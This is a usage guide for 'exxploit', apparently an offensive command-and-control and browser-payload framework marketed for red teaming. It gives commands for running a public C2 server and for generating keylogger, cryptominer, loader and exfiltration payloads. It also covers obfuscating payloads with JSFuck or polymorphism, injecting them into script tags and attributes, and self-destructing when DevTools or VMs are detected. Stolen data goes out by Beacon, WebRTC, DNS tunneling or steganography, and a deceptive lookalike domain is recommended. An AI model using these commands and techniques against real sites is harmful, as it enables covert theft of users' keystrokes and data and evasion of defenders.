# exxploit Operational Guide

This detailed guide covers advanced usage, session management, and operational security (OpSec) for red team engagements.

---

## 🏗️ Core Workflows

### 1. Training & Simulation (`exxploit lab`)

Before targeting live systems, use the built-in isolated lab.

```bash
exxploit lab
```
- **Target**: `http://localhost:5000` (Vulnerable Flask App)
- **C2**: `http://localhost:8081` (Isolated Server)
- **Logs**: `tests/lab_logs/`

> **Note**: Lab mode is fully sandboxed. It will NOT affect your live `~/.exxploit/sessions.json` or production logs.

---

### 2. Session Management

Real-world engagements require isolation. Never reuse keys across clients.

**Start a New Engagement:**
```bash
exxploit session new project-alpha --target https://alpha-corp.com
```
*Automatically generates a unique 256-bit AES auth key.*

**List Sessions:**
```bash
exxploit session list
```

**Switch Context:**
```bash
exxploit session use project-beta
```

---

### 3. C2 Infrastructure (`exxploit server`)

The C2 server automatically loads the key from your **active session**.

**Basic Start:**
```bash
exxploit server
```

**Production Mode (Public IP):**
```bash
exxploit server --host 0.0.0.0 --port 80
```
*Requires `sudo` for port 80.*

**OpSec Recommendations:**
- Run behind Nginx/Caddy with SSL.
- Use a domain name (e.g., `cdn-jquery-update.com`) for credibility.
- Set `EXXPLOIT_AUTH_KEY` manually if using a stateless container.

---

## 🛠️ Payload Generation

### Basic Payloads
```bash
exxploit payload keylogger
```

### Advanced Obfuscation
Bypass simple signature detections.

```bash
# JSDuck Obfuscation
exxploit payload miner --obfuscate jsfuck

# Polymorphic (Unique every time)
exxploit payload loader --poly
```

### Context Awareness
Injecting into different HTML contexts requires different escaping.

```bash
# Injection into <script> tag
exxploit payload exfil --context script

# Injection into onclick="" attribute
exxploit payload keylogger --context attribute
```

---

## 🕵️ Stealth & Evasion

### The `evasion` Module
Always include this at the start of your chain for zero-day protection.

```bash
exxploit attack https://target.com --payloads "evasion,keylogger"
```
**Features:**
- **DevTools Detect**: Self-destructs if victim opens F12.
- **VM Detect**: Checks for low core count/RAM.
- **Headless Detect**: ID's Puppeteer/Selenium bots.

### The `camouflage` Module
Masks bot-like behavior.
- Adds random mouse jitter.
- Scrolls page naturally.
- Waits for user interaction before triggering payloads.

---

## 📊 Data Exfiltration

Data is received at the C2 server and logged to `logs/c2_events.json`.

**Supported Methods:**
1. **Beacon API** (Default): Fast, asynchronous, reliable.
2. **WebRTC**: Bypasses some firewalls.
3. **DNS Tunneling**: Slow, but extremely stealthy (`exfil.js`).
4. **Steganography**: Embeds data in image uploads.

**Viewing Data:**
```bash
# TUI Dashboard
exxploit sessions

# Raw Log Access
tail -f logs/c2_events.json
```
